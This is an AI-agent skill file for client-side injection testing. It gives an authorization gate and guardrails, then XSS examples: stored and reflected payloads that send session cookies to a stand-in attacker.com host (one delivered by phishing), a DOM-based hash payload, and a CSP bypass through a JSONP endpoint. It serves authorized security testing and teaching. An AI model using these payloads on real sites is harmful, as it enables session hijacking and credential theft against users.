---
name: xss-html-injection
description: "Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms."
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.

# Cross-Site Scripting and HTML Injection Testing

## Detailed Guide

Read [the detailed guide](references/detailed-guide.md) before executing this skill. It retains the complete procedure and reference material. Treat its safety, prerequisites, and validation requirements as mandatory. For focused work, load the relevant sections; for end-to-end work, read the guide completely.

## Constraints and Guardrails

### Operational Boundaries
- Never inject payloads that could damage production systems
- Limit cookie/session capture to demonstration purposes only
- Avoid payloads that could spread to unintended users (worm behavior)
- Do not exfiltrate real user data beyond scope requirements

### Technical Limitations
- Content Security Policy (CSP) may block inline scripts
- HttpOnly cookies prevent JavaScript access
- SameSite cookie attributes limit cross-origin attacks
- Modern frameworks often auto-escape outputs

### Legal and Ethical Requirements
- Written authorization required before testing
- Report critical XSS vulnerabilities immediately
- Handle captured credentials per data protection agreements
- Do not use discovered vulnerabilities for unauthorized access

## Examples

### Example 1: Stored XSS in Comment Section

**Scenario**: Blog comment feature vulnerable to stored XSS

**Detection**:
```
POST /api/comments
Content-Type: application/json

{"body": "<script>alert('XSS')</script>", "postId": 123}
```

**Observation**: Comment renders and script executes for all viewers

**Exploitation Payload**:
```html
<script>
var i = new Image();
i.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

**Result**: Every user viewing the comment has their session cookie sent to attacker's server.

### Example 2: Reflected XSS via Search Parameter

**Scenario**: Search results page reflects query without encoding

**Vulnerable URL**:
```
https://shop.example.com/search?q=test
```

**Detection Test**:
```
https://shop.example.com/search?q=<script>alert(document.domain)</script>
```

**Crafted Attack URL**:
```
https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch('https://attacker.com/log?c='+document.cookie)%22%3E
```

**Delivery**: URL sent via phishing email to target user.

### Example 3: DOM-Based XSS via Hash Fragment

**Scenario**: JavaScript reads URL hash and inserts into DOM

**Vulnerable Code**:
```javascript
document.getElementById('welcome').innerHTML = 'Hello, ' + location.hash.slice(1);
```

**Attack URL**:
```
https://app.example.com/dashboard#<img src=x onerror=alert(document.cookie)>
```

**Result**: Script executes entirely client-side; payload never touches server.

### Example 4: CSP Bypass via JSONP Endpoint

**Scenario**: Site has CSP but allows trusted CDN

**CSP Header**:
```
Content-Security-Policy: script-src 'self' https://cdn.trusted.com
```

**Bypass**: Find JSONP endpoint on trusted domain:
```html
<script src="https://cdn.trusted.com/api/jsonp?callback=alert"></script>
```

**Result**: CSP bypassed using allowed script source.

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.
